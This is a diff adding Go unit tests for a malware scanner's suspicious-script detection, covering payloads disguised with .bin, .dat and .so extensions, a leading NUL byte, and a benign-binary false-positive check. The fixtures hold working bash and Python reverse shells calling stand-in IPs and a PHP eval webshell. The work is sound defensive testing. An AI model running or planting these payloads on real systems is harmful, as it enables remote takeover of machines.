@@ -754,5 +754,77 @@ func TestCheckSuspiciousScriptContent_MiddleOfFileEvasion(t *testing.T) {
 	}
 }
 
+func TestCheckAllSuspiciousScriptContent_BinaryExtensionEvasion(t *testing.T) {
+	cfg := config.NewDefaultConfig()
 
+	// 1. Shebang-less reverse shell named .bin in /tmp
+	binPayload := []byte("/bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n")
+	matches := scanner.CheckAllSuspiciousScriptContent("/tmp/payload.bin", binPayload, nil, cfg)
+	if len(matches) == 0 {
+		t.Fatalf("expected payload.bin to be detected, got 0 matches")
+	}
+	if matches[0].Name != "Script_Reverse_Shell_Interactive" {
+		t.Errorf("expected Script_Reverse_Shell_Interactive, got %s", matches[0].Name)
+	}
 
+	// 2. Shebang-less PHP webshell named .dat in /var/www/html
+	phpPayload := []byte("<?php eval($_POST['cmd']); ?>\n")
+	phpMatches := scanner.CheckAllSuspiciousScriptContent("/var/www/html/include.dat", phpPayload, nil, cfg)
+	if len(phpMatches) == 0 {
+		t.Fatalf("expected include.dat to be detected, got 0 matches")
+	}
+	foundWebshell := false
+	for _, m := range phpMatches {
+		if m.Name == "Webshell_PHP_Generic_Backdoor" {
+			foundWebshell = true
+			break
+		}
+	}
+	if !foundWebshell {
+		t.Errorf("expected Webshell_PHP_Generic_Backdoor, got %v", phpMatches)
+	}
+
+	// 3. Shebang-less inline reverse shell named .so in /dev/shm
+	pyPayload := []byte("import socket,os,subprocess\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect(('10.0.0.1',4444))\nos.dup2(s.fileno(),0)\nos.dup2(s.fileno(),1)\nos.dup2(s.fileno(),2)\nsubprocess.call(['/bin/sh','-i'])\n")
+	soMatches := scanner.CheckAllSuspiciousScriptContent("/dev/shm/module.so", pyPayload, nil, cfg)
+	if len(soMatches) == 0 {
+		t.Fatalf("expected module.so (non-ELF) to be detected, got 0 matches")
+	}
+	if soMatches[0].Name != "Script_Reverse_Shell_Inline" {
+		t.Errorf("expected Script_Reverse_Shell_Inline, got %s", soMatches[0].Name)
+	}
+}
+
+func TestCheckAllSuspiciousScriptContent_EarlyNULByteEvasion(t *testing.T) {
+	cfg := config.NewDefaultConfig()
+
+	// Attacker prepends a single null byte to evade traditional git/POSIX 512-byte text check
+	nulPayload := append([]byte{0x00}, []byte("/bin/bash -i >& /dev/tcp/1.2.3.4/4444 0>&1\n")...)
+	matches := scanner.CheckAllSuspiciousScriptContent("/tmp/evasion.sh", nulPayload, nil, cfg)
+	if len(matches) == 0 {
+		t.Fatalf("expected early NUL byte script to be detected, got 0 matches")
+	}
+	if matches[0].Name != "Script_Reverse_Shell_Interactive" {
+		t.Errorf("expected Script_Reverse_Shell_Interactive, got %s", matches[0].Name)
+	}
+}
+
+func TestCheckAllSuspiciousScriptContent_BenignBinaryNoFalsePositive(t *testing.T) {
+	cfg := config.NewDefaultConfig()
+
+	// Benign binary buffer containing null bytes, high entropy bytes, and no attack primitives
+	benignData := make([]byte, 8192)
+	for i := range benignData {
+		benignData[i] = byte(i % 256)
+	}
+
+	matchesBin := scanner.CheckAllSuspiciousScriptContent("/tmp/firmware.bin", benignData, nil, cfg)
+	if len(matchesBin) != 0 {
+		t.Errorf("expected 0 matches for benign binary firmware.bin, got %d matches", len(matchesBin))
+	}
+
+	matchesDat := scanner.CheckAllSuspiciousScriptContent("/var/www/cache.dat", benignData, nil, cfg)
+	if len(matchesDat) != 0 {
+		t.Errorf("expected 0 matches for benign cache.dat, got %d matches", len(matchesDat))
+	}
+}
